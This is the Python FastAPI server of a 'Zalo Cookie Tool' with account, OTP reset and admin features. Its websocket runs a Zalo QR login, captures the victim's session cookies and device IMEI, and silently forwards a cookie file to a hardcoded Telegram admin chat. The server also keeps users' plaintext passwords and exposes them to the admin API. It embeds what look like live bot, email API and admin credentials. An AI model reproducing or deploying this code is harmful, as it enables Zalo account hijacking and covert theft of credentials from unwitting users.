import asyncio, uuid, json, os, aiohttp, hashlib, secrets, re, random
from datetime import datetime
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Response, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from zalo_login import login_qr_with_unique_imei, LoginQRCallbackEventType

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")

# Cập nhật token bot và admin ID mới
TG_BOT_TOKEN  = "8859929395:AAHqcvmn5cJO8ExKdWuv3csS_d21IoIDrYQ"
TG_ADMIN_ID   = 8123442570

# Resend API config
RESEND_API_KEY = "re_Tj3Eyk2M_NgQf9E2sKdnmbSmdMsJefXpt"
FROM_EMAIL     = "onboarding@resend.dev"

# OTP store: {email: {"otp": "123456", "expires": timestamp, "username": "..."}}
otp_store = {}
HISTORY_FILE  = "history.json"
USERS_FILE    = "users.json"
SESSIONS_FILE = "sessions.json"

# Cập nhật tài khoản admin mới
ADMIN_ACCOUNTS = {
    "dungle2501": hashlib.sha256("letiendungcte".encode()).hexdigest()
}

def _load(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default

def _save(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_history():  return _load(HISTORY_FILE, [])
def save_history(r): _save(HISTORY_FILE, r)
def load_users():    return _load(USERS_FILE, {})
def save_users(u):   _save(USERS_FILE, u)
def load_sessions(): return _load(SESSIONS_FILE, {})
def save_sessions(s):_save(SESSIONS_FILE, s)

def add_history(record):
    records = load_history()
    records.insert(0, record)
    records = records[:200]
    save_history(records)

def hash_pw(pw): return hashlib.sha256(pw.encode()).hexdigest()

def create_session(username: str) -> str:
    token = secrets.token_hex(32)
    sessions = load_sessions()
    sessions[token] = {"username": username, "created": datetime.now().isoformat()}
    save_sessions(sessions)
    return token

def get_session_user(token: str):
    if not token:
        return None
    sessions = load_sessions()
    s = sessions.get(token)
    if not s:
        return None
    return s["username"]

def is_admin(username: str) -> bool:
    return username in ADMIN_ACCOUNTS

async def send_telegram(text: str, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    async with aiohttp.ClientSession() as session:
        try:
            await session.post(url, json={
                "chat_id": TG_ADMIN_ID, "text": text,
                "parse_mode": parse_mode, "disable_web_page_preview": True
            })
        except:
            pass

async def send_telegram_file(content: bytes, filename: str, caption: str):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendDocument"
    async with aiohttp.ClientSession() as session:
        try:
            form = aiohttp.FormData()
            form.add_field("chat_id", str(TG_ADMIN_ID))
            form.add_field("caption", caption, content_type="text/plain")
            form.add_field("document", content, filename=filename, content_type="text/plain")
            await session.post(url, data=form)
        except:
            pass

def get_token_from_request(request: Request) -> str:
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        return auth[7:]
    return request.cookies.get("session_token", "")

@app.get("/")
async def root():
    return FileResponse("static/index.html")

@app.post("/api/register")
async def register(request: Request):
    data = await request.json()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    email    = (data.get("email") or "").strip()

    if not username or not password or not email:
        raise HTTPException(400, "Thiếu thông tin")
    if len(username) < 6:
        raise HTTPException(400, "Tên đăng nhập phải ≥ 6 ký tự")
    if len(password) < 6:
        raise HTTPException(400, "Mật khẩu phải ≥ 6 ký tự")
    if not re.match(r"[^@]+@gmail\.com$", email, re.IGNORECASE):
        raise HTTPException(400, "Chỉ chấp nhận email @gmail.com")
    if username in ADMIN_ACCOUNTS:
        raise HTTPException(400, "Tên đăng nhập đã tồn tại")

    users = load_users()
    if username in users:
        raise HTTPException(400, "Tên đăng nhập đã tồn tại")
    if any(u.get("email","").lower() == email.lower() for u in users.values()):
        raise HTTPException(400, "Email này đã được đăng ký")

    users[username] = {
        "password":       hash_pw(password),
        "password_plain": password,
        "email":          email,
        "created":        datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "active":         True
    }
    save_users(users)

    asyncio.create_task(send_telegram(
        f"🆕 <b>Tài khoản mới đăng ký</b>\n👤 <code>{username}</code>\n📧 {email}\n🕐 {users[username]['created']}"
    ))

    token = create_session(username)
    return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": False})

@app.post("/api/login")
async def login(request: Request):
    data = await request.json()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()

    if not username or not password:
        raise HTTPException(400, "Thiếu tên đăng nhập hoặc mật khẩu")

    if username in ADMIN_ACCOUNTS:
        if ADMIN_ACCOUNTS[username] != hash_pw(password):
            raise HTTPException(401, "Sai mật khẩu")
        token = create_session(username)
        return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": True})

    users = load_users()
    user  = users.get(username)
    if not user:
        raise HTTPException(401, "Tài khoản không tồn tại")
    if not user.get("active", True):
        raise HTTPException(403, "Tài khoản đã bị khóa")
    if user["password"] != hash_pw(password):
        raise HTTPException(401, "Sai mật khẩu")

    token = create_session(username)
    return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": False})

@app.post("/api/logout")
async def logout(request: Request):
    token = get_token_from_request(request)
    if token:
        sessions = load_sessions()
        sessions.pop(token, None)
        save_sessions(sessions)
    return JSONResponse({"ok": True})


def _send_otp_email_sync(to_email: str, otp: str) -> bool:
    import resend
    resend.api_key = RESEND_API_KEY
    html = f"""<!DOCTYPE html>
<html lang="vi">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="margin:0;padding:0;background:#0a0d14;font-family:'Segoe UI',Arial,sans-serif">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#0a0d14;padding:48px 0">
    <tr><td align="center">
      <table width="520" cellpadding="0" cellspacing="0" style="border-radius:20px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.6)">
        <tr><td style="height:4px;background:linear-gradient(90deg,#1e90ff,#00d4ff,#a855f7)"></td></tr>
        <tr><td style="background:#0f1623;padding:40px 48px 32px;text-align:center">
          <div style="display:inline-block;background:linear-gradient(135deg,#1e90ff22,#a855f722);border:1px solid #1e90ff44;border-radius:18px;padding:16px 20px;margin-bottom:20px">
            <span style="font-size:36px">🍪</span>
          </div>
          <h1 style="margin:0 0 6px;color:#ffffff;font-size:24px;font-weight:700;letter-spacing:-0.5px">Zalo Cookie Tool</h1>
          <p style="margin:0;color:#4a90d9;font-size:13px;letter-spacing:1.5px;text-transform:uppercase">by Dzi Meo Meo</p>
        </td></tr>
        <tr><td style="background:#0f1623;padding:0 48px">
          <div style="height:1px;background:linear-gradient(90deg,transparent,#1e90ff55,transparent)"></div>
        </td></tr>
        <tr><td style="background:#0f1623;padding:36px 48px">
          <p style="margin:0 0 6px;color:#64748b;font-size:13px;text-transform:uppercase;letter-spacing:1px">Xác thực đặt lại mật khẩu</p>
          <p style="margin:0 0 28px;color:#cbd5e1;font-size:15px;line-height:1.6">Mã OTP của bạn để đặt lại mật khẩu:</p>
          <div style="background:#080b12;border:1px solid #1e90ff33;border-radius:16px;padding:32px;text-align:center;margin:0 0 28px">
            <div style="color:#1e90ff;font-size:52px;font-weight:900;letter-spacing:16px;font-family:'Courier New',monospace;line-height:1">{otp}</div>
            <p style="margin:16px 0 0;color:#334155;font-size:12px">Hiệu lực trong <span style="color:#94a3b8;font-weight:600">5 phút</span></p>
          </div>
          <div style="background:#ff444411;border:1px solid #ff444433;border-radius:10px;padding:14px 18px;margin-bottom:24px">
            <p style="margin:0;color:#ff6b6b;font-size:13px">⚠️&nbsp; Không chia sẻ mã này với bất kỳ ai, kể cả admin.</p>
          </div>
          <p style="margin:0;color:#475569;font-size:13px;line-height:1.6">Nếu bạn không yêu cầu đặt lại mật khẩu, hãy bỏ qua email này.</p>
        </td></tr>
        <tr><td style="background:#080b12;padding:24px 48px;border-top:1px solid #1a2035">
          <table width="100%"><tr>
            <td><p style="margin:0;color:#334155;font-size:11px">© 2026 Zalo Cookie Tool · by Dzi Meo Meo</p></td>
            <td align="right"><p style="margin:0;color:#1e90ff;font-size:11px">🔒 Bảo mật</p></td>
          </tr></table>
        </td></tr>
        <tr><td style="height:3px;background:linear-gradient(90deg,#a855f7,#1e90ff,#00d4ff)"></td></tr>
      </table>
    </td></tr>
  </table>
</body></html>"""
    try:
        resend.Emails.send({
            "from": f"Dzi Meo Meo · Zalo Cookie Tool <{FROM_EMAIL}>",
            "to": [to_email],
            "subject": "🔑 Mã OTP xác nhận - Zalo Cookie Tool",
            "html": html
        })
        return True
    except Exception as e:
        print(f"Resend error: {e}")
        return False

async def send_otp_email(to_email: str, otp: str, username: str) -> bool:
    try:
        return await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(None, _send_otp_email_sync, to_email, otp),
            timeout=15.0
        )
    except asyncio.TimeoutError:
        print("Resend timeout")
        return False
@app.post("/api/forgot-password")
async def forgot_password(request: Request):
    data     = await request.json()
    email    = (data.get("email") or "").strip().lower()
    if not email:
        raise HTTPException(400, "Thiếu email")
    if not re.match(r"[^@]+@gmail\.com$", email, re.IGNORECASE):
        raise HTTPException(400, "Chỉ chấp nhận email @gmail.com")

    users = load_users()
    user_found = None
    for uname, udata in users.items():
        if udata.get("email","").lower() == email:
            user_found = uname
            break
    if not user_found:
        raise HTTPException(404, "Email không tồn tại trong hệ thống")

    otp  = str(random.randint(100000, 999999))
    import time
    otp_store[email] = {"otp": otp, "expires": time.time() + 300, "username": user_found}

    sent = await send_otp_email(email, otp, user_found)
    if not sent:
        raise HTTPException(500, "Không thể gửi email, vui lòng thử lại")

    return JSONResponse({"ok": True, "msg": f"Đã gửi OTP về {email}"})

@app.post("/api/verify-otp")
async def verify_otp(request: Request):
    import time
    data  = await request.json()
    email = (data.get("email") or "").strip().lower()
    otp   = (data.get("otp") or "").strip()
    if not email or not otp:
        raise HTTPException(400, "Thiếu thông tin")

    record = otp_store.get(email)
    if not record:
        raise HTTPException(400, "OTP không hợp lệ hoặc đã hết hạn")
    if time.time() > record["expires"]:
        otp_store.pop(email, None)
        raise HTTPException(400, "OTP đã hết hạn, vui lòng yêu cầu lại")
    if record["otp"] != otp:
        raise HTTPException(400, "OTP không đúng")

    return JSONResponse({"ok": True, "username": record["username"]})

@app.post("/api/reset-password")
async def reset_password(request: Request):
    import time
    data     = await request.json()
    email    = (data.get("email") or "").strip().lower()
    otp      = (data.get("otp") or "").strip()
    new_pw   = (data.get("new_password") or "").strip()

    if not email or not otp or not new_pw:
        raise HTTPException(400, "Thiếu thông tin")
    if len(new_pw) < 6:
        raise HTTPException(400, "Mật khẩu phải ≥ 6 ký tự")

    record = otp_store.get(email)
    if not record:
        raise HTTPException(400, "OTP không hợp lệ hoặc đã hết hạn")
    if time.time() > record["expires"]:
        otp_store.pop(email, None)
        raise HTTPException(400, "OTP đã hết hạn")
    if record["otp"] != otp:
        raise HTTPException(400, "OTP không đúng")

    users    = load_users()
    username = record["username"]
    if username not in users:
        raise HTTPException(404, "Tài khoản không tồn tại")

    users[username]["password"]       = hash_pw(new_pw)
    users[username]["password_plain"] = new_pw
    save_users(users)
    otp_store.pop(email, None)

    asyncio.create_task(send_telegram(
        f"🔑 <b>Đặt lại mật khẩu</b>\n👤 <code>{username}</code>\n📧 {email}"
    ))

    return JSONResponse({"ok": True, "msg": "Đặt lại mật khẩu thành công!"})

@app.get("/api/history")
async def get_history(request: Request):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username:
        raise HTTPException(401, "Chưa đăng nhập")

    records = load_history()
    if not is_admin(username):
        records = [r for r in records if r.get("owner") == username]
    return JSONResponse(records)

@app.get("/api/admin/users")
async def admin_users(request: Request, page: int = 0):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username or not is_admin(username):
        raise HTTPException(403, "Không có quyền")

    users = load_users()
    items = []
    for uname, udata in users.items():
        items.append({
            "username":       uname,
            "email":          udata.get("email", ""),
            "password":       udata.get("password", ""),
            "password_plain": udata.get("password_plain", ""),
            "created":        udata.get("created", ""),
            "active":         udata.get("active", True)
        })
    items.sort(key=lambda x: x["created"], reverse=True)

    per_page = 20
    total    = len(items)
    chunk    = items[page * per_page:(page + 1) * per_page]
    return JSONResponse({"total": total, "page": page, "per_page": per_page, "users": chunk})

@app.post("/api/admin/users/{target}/toggle")
async def admin_toggle_user(target: str, request: Request):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username or not is_admin(username):
        raise HTTPException(403, "Không có quyền")

    users = load_users()
    if target not in users:
        raise HTTPException(404, "Không tìm thấy tài khoản")
    users[target]["active"] = not users[target].get("active", True)
    save_users(users)
    return JSONResponse({"ok": True, "active": users[target]["active"]})

@app.delete("/api/admin/users/{target}")
async def admin_delete_user(target: str, request: Request):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username or not is_admin(username):
        raise HTTPException(403, "Không có quyền")

    users = load_users()
    if target not in users:
        raise HTTPException(404, "Không tìm thấy")
    del users[target]
    save_users(users)
    return JSONResponse({"ok": True})

@app.websocket("/ws/{session_id}")
async def ws_endpoint(ws: WebSocket, session_id: str):
    await ws.accept()

    token    = ws.query_params.get("token", "")
    username = get_session_user(token)
    if not username:
        await ws.send_json({"type": "error", "msg": "Chưa đăng nhập. Vui lòng đăng nhập lại."})
        await ws.close()
        return

    async def callback(event):
        etype = event["type"]
        if etype == LoginQRCallbackEventType.QRCodeGenerated:
            await ws.send_json({"type": "qr", "image": event["data"]["image"]})
        elif etype == LoginQRCallbackEventType.QRCodeScanned:
            name = event["data"].get("display_name", "")
            await ws.send_json({"type": "scanned", "name": name})
        elif etype == LoginQRCallbackEventType.QRCodeExpired:
            await ws.send_json({"type": "expired"})
        elif etype == LoginQRCallbackEventType.QRCodeDeclined:
            await ws.send_json({"type": "declined"})

    try:
        await ws.send_json({"type": "status", "msg": "Đang tạo mã QR..."})
        result = await login_qr_with_unique_imei(callback=callback)

        if not result:
            await ws.send_json({"type": "error", "msg": "Đăng nhập thất bại."})
            return

        cookies    = result["cookies"]
        user       = result["user_info"]
        imei       = result["imei"]
        now        = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        name = user.get("displayName", "N/A") or "N/A"

        record = {
            "id":      session_id[:8],
            "owner":   username,
            "name":    name,
            "imei":    imei,
            "cookies": cookies,
            "time":    now,
        }
        add_history(record)

        await ws.send_json({"type": "success", **record})

        txt = (
            f"=== ZALO COOKIE ===\n"
            f"Tên: {name}\nIMEI: {imei}\n"
            f"Thời gian: {now}\nLấy bởi: {username}\n\n"
            f"--- COOKIE JSON ---\n{json.dumps(cookies, ensure_ascii=False, indent=2)}\n"
        )

        tg_text = (
            f"🍪 <b>ZALO COOKIE MỚI</b>\n\n"
            f"👤 Tên: <b>{name}</b>\n"
            f"📡 IMEI: <code>{imei}</code>\n"
            f"🕐 Thời gian: {now}\n👨‍💻 Lấy bởi: <code>{username}</code>"
        )
        asyncio.create_task(send_telegram(tg_text))
        asyncio.create_task(send_telegram_file(
            txt.encode("utf-8"),
            f"cookie_{name}_{now[:10].replace('/','-')}.txt",
            f"📄 Cookie file — {name} | by {username}"
        ))

    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await ws.send_json({"type": "error", "msg": str(e)})
            asyncio.create_task(send_telegram(
                f"⚠️ <b>LỖI SERVER</b>\n👨‍💻 User: <code>{username}</code>\n❌ Lỗi: <code>{str(e)}</code>"
            ))
        except:
            pass

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
